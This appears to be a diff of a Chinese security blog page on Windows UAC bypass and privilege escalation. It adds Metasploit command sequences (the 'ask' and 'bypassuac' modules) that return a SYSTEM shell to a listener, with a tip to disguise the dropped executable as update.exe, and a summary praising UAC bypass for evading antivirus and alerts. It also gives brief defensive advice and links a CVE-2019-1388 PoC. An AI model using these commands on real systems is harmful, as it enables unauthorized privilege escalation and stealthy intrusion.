@@ -664,7 +664,16 @@
 <p><strong>常见利用接口</strong></p>
 <p>ICMLuaUtil接口</p>
 <h2 id="0x03提权"><a href="#0x03提权" class="headerlink" title="0x03提权"></a>0x03提权</h2><h3 id="1、metasploit模块"><a href="#1、metasploit模块" class="headerlink" title="1、metasploit模块"></a>1、metasploit模块</h3><p><strong>exploit&#x2F;windows&#x2F;loacal&#x2F;ask</strong></p>
+<p>会在目标主机上创建一个exe文件，运行提升权限的程序，当用户点击是的时候会返回一个system的shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/local/ask</span><br><span class="line">set filename update.exe #设置运行程序名，尽可能设置一个不易发现的名字。</span><br><span class="line">set session 17</span><br><span class="line">set lhost 192.168.178.131</span><br><span class="line">set lport 4444</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
 <p><strong>exploit&#x2F;windows&#x2F;local&#x2F;bypassuac</strong></p>
+<p>通过进程注入到受信任的证书绕过UAC，使用的前提是当前用户必须在管理员组中，且UAC必须为默认设置（“仅在程序试图更改我的计算机时提醒我”）</p>
+<p>成功后会返回一个新的session，在里面输入getsystem提权的指令就会返回一个system的shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/local/bypassuac</span><br><span class="line">set session 7</span><br><span class="line">set lhost 192.168.178.131</span><br><span class="line">Set lport 4444</span><br><span class="line">Run</span><br></pre></td></tr></table></figure>
+
+
+
 <h3 id="2、CVE漏洞"><a href="#2、CVE漏洞" class="headerlink" title="2、CVE漏洞"></a>2、CVE漏洞</h3><h3 id="CVE-2019-1388"><a href="#CVE-2019-1388" class="headerlink" title="CVE-2019-1388"></a><strong>CVE-2019-1388</strong></h3><p>默认情况下，Windows会在一个单独的桌面上显示所有的UAC提示——Secure Desktop</p>
 <p>这些提示是由名为consent.exe的可执行文件产生的，该可执行文件以NT AUTHORITY\SYSTEM权限运行，完整性级别为System</p>
 <p><a target="_blank" rel="noopener" href="https://github.com/jas502n/CVE-2019-1388">https://github.com/jas502n/CVE-2019-1388</a></p>
@@ -677,7 +686,7 @@
 <h2 id="0x04防御"><a href="#0x04防御" class="headerlink" title="0x04防御"></a>0x04防御</h2><p>1、保证最低权限运行方式</p>
 <p>2、本地使用管理员登录的话，则将权限开启最高，始终通知</p>
 <p>3、不让内网机器使用管理员权限</p>
-<h2 id="0x05总结"><a href="#0x05总结" class="headerlink" title="0x05总结"></a>0x05总结</h2><p>UAC的作用主要还是用于防止以管理员身份进行恶意操作，出现弹窗。而绕过	</p>
+<h2 id="0x05总结"><a href="#0x05总结" class="headerlink" title="0x05总结"></a>0x05总结</h2><p>UAC的作用主要还是用于防止以当前身份进行恶意操作，出现弹窗提示当前用户正在进行敏感操作。绕过UAC一般是为了能在windows提升权限到管理员，从而不会在进行敏感操作的时候进行弹窗，需要用户确认。同时一些杀毒或者安全软件是根据UAC的机制来防止系统软件被篡改，这样可以绕过一些安全软件的追查和阻止，并避免告警，提高了行动隐匿性。</p>
 
       </div>
       <div class="post-tags-categories">
@@ -716,6 +725,25 @@
 <div class="post-nav">
 
 
+
+  
+  <div class="post-nav-prev post-nav-item">
+    <div class="post-nav-img" style="background-size: cover; 
+      background-position: center center;">
+      <img class="lazyload lazyload placeholder" src="/medias/img8.jpg" class="lazyload placeholder" data-srcset="/medias/img8.jpg" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="">
+    </div>
+    <a href="/2024/08/30/%E5%9B%BD%E6%8A%A4%E7%BA%A2%E9%98%9F%E5%A4%8D%E7%9B%98/" class="post-nav-link">
+      <div class="title">
+        <i class="fas fa-angle-left"></i> Prev:
+        <div class="title-text">国护红队复盘</div>
+      </div>
+      
+      <!-- <div class="content">
+        0x00前言本次HW作为红队方，负责外围打点，这次HW共有近百个单位参与攻击和防守。
+0x01搜集开始时上级发了一份靶标
+      </div> -->
+    </a>
+  </div>
 
 
 
